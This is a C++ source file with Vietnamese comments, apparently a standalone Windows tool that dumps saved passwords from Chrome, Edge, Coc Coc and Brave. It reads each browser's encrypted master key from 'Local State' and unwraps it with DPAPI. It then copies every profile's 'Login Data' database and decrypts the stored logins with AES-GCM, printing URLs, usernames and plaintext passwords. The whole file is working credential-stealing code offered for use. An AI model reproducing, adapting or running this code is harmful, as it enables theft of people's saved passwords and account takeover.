#include <iostream>
#include <fstream>
#include <vector>
#include <string>

// Thư viện Windows
#include <windows.h>
#include <dpapi.h>
#include <shlobj.h>
#include <bcrypt.h>

// Thư viện ngoài
#include "json.hpp"
#include "sqlite3.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")

using json = nlohmann::json;
using namespace std;

// --- CẤU TRÚC ĐỂ QUẢN LÝ NHIỀU TRÌNH DUYỆT ---
struct BrowserTarget {
    string name;
    string pathSuffix;
};

// --- HÀM 1: GIẢI MÃ BASE64 ---
static const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

vector<BYTE> Base64Decode(string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    vector<BYTE> ret;

    while (in_len-- && (encoded_string[in_] != '=') && isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/')) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

// --- HÀM 2: GIẢI MÃ AES-GCM ---
vector<BYTE> AES_GCM_Decrypt(const vector<BYTE>& key, const vector<BYTE>& iv, const vector<BYTE>& ciphertext, const vector<BYTE>& authTag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    vector<BYTE> plaintext;
    NTSTATUS status = 0;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    ULONG resultLen = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return {};
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) goto cleanup;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) goto cleanup;

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv.data();
    authInfo.cbNonce = (ULONG)iv.size();
    authInfo.pbTag = (PUCHAR)authTag.data();
    authInfo.cbTag = (ULONG)authTag.size();

    plaintext.resize(ciphertext.size());
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &resultLen, 0);

    if (status != 0) plaintext.clear();
    else plaintext.resize(resultLen);

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return plaintext;
}

// --- HÀM 3: LẤY MASTER KEY ---
vector<BYTE> GetMasterKey(string localStatePath) {
    ifstream f(localStatePath);
    if (!f.is_open()) return {};

    try {
        json j = json::parse(f);
        string encrypted_key_b64 = j["os_crypt"]["encrypted_key"];
        vector<BYTE> encrypted_key = Base64Decode(encrypted_key_b64);

        if (encrypted_key.size() < 5) return {};
        DATA_BLOB in, out;
        in.pbData = encrypted_key.data() + 5;
        in.cbData = (DWORD)(encrypted_key.size() - 5);

        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            vector<BYTE> master_key(out.pbData, out.pbData + out.cbData);
            LocalFree(out.pbData);
            return master_key;
        }
    }
    catch (...) {}
    return {};
}

// --- HÀM 4: ĐỌC DỮ LIỆU TỪ 1 FILE DB CỤ THỂ ---
void ReadDB(string dbPath, const vector<BYTE>& masterKey) {
    string tempDb = "Temp_" + to_string(rand()) + ".db";

    // Copy file để tránh bị lock
    if (CopyFileA(dbPath.c_str(), tempDb.c_str(), FALSE) == 0) return;

    sqlite3* db;
    if (sqlite3_open(tempDb.c_str(), &db) == SQLITE_OK) {
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* user = (const char*)sqlite3_column_text(stmt, 1);
                const void* passBlob = sqlite3_column_blob(stmt, 2);
                int passLen = sqlite3_column_bytes(stmt, 2);

                if (user && strlen(user) > 0 && passLen >= 31) {
                    cout << "   [+] URL:  " << url << "\n";
                    cout << "   [+] User: " << user << "\n";

                    vector<BYTE> buff((BYTE*)passBlob, (BYTE*)passBlob + passLen);

                    // In ra để xem đầu file nó là chữ gì (Debug)
                    cout << "   [?] Header: " << (char)buff[0] << (char)buff[1] << (char)buff[2] << "\n";

                    // Ép giải mã luôn (Giả sử vẫn là v10/v20 có cấu trúc tương tự)
                    try {
                        // Header 3 byte + IV 12 byte = 15 byte đầu
                        vector<BYTE> iv(buff.begin() + 3, buff.begin() + 15);
                        vector<BYTE> ciphertext(buff.begin() + 15, buff.end() - 16);
                        vector<BYTE> authTag(buff.end() - 16, buff.end());

                        vector<BYTE> decrypted = AES_GCM_Decrypt(masterKey, iv, ciphertext, authTag);

                        if (!decrypted.empty()) {
                            string passStr(decrypted.begin(), decrypted.end());
                            cout << "   [=] PASS: " << passStr << "\n";
                        }
                        else {
                            cout << "   [!] PASS: (Giai ma THAT BAI)\n";
                        }
                    }
                    catch (...) {
                        cout << "   [!] Loi cau truc du lieu\n";
                    }
                    cout << "   --------------------------------\n";
                }
            }
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    DeleteFileA(tempDb.c_str());
}

// --- HÀM 5: TỰ ĐỘNG QUÉT TẤT CẢ PROFILE (MỚI) ---
void ScanAllProfiles(string userDataPath, const vector<BYTE>& masterKey) {
    string searchPath = userDataPath + "\\*"; // Quét tất cả thư mục
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                string folderName = fd.cFileName;

                // Bỏ qua thư mục . và ..
                if (folderName == "." || folderName == "..") continue;

                // Logic: Tìm thư mục "Default" HOẶC các thư mục bắt đầu bằng chữ "Profile"
                // (Ví dụ: Profile 1, Profile 2...)
                if (folderName == "Default" || folderName.find("Profile") == 0) {

                    // Tạo đường dẫn đến file Login Data của Profile đó
                    string dbPath = userDataPath + "\\" + folderName + "\\Login Data";

                    // Kiểm tra xem file Login Data có tồn tại không
                    if (GetFileAttributesA(dbPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        cout << "    >>> Dang quet Profile: " << folderName << " <<<\n";
                        ReadDB(dbPath, masterKey);
                    }
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
}

int main() {
    // SetConsoleOutputCP(65001); // Uncomment nếu muốn hiện tiếng Việt có dấu
    cout << "==========================================\n";
    cout << "   TOOL SCAN ALL PROFILES C++ (FINAL)     \n";
    cout << "==========================================\n\n";

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    string basePath(appDataPath);

    vector<BrowserTarget> targets = {
        {"Google Chrome", "\\Google\\Chrome\\User Data"},
        {"Microsoft Edge", "\\Microsoft\\Edge\\User Data"},
        {"Coc Coc",       "\\CocCoc\\Browser\\User Data"},
        {"Brave Browser", "\\BraveSoftware\\Brave-Browser\\User Data"}
    };

    for (const auto& browser : targets) {
        cout << "[*] TRINH DUYET: " << browser.name << "...\n";

        // 1. Lấy Master Key (Dùng chung cho cả trình duyệt)
        string keyPath = basePath + browser.pathSuffix + "\\Local State";
        vector<BYTE> key = GetMasterKey(keyPath);

        if (key.empty()) {
            cout << "    -> Khong cai dat.\n\n";
            continue;
        }

        // 2. Gọi hàm quét thông minh (Scan All Profiles)
        string userDataPath = basePath + browser.pathSuffix;
        ScanAllProfiles(userDataPath, key);

        cout << "\n";
    }

    cout << "DA QUET XONG! Nhan phim bat ky de thoat...\n";
    system("pause > nul");
    return 0;
}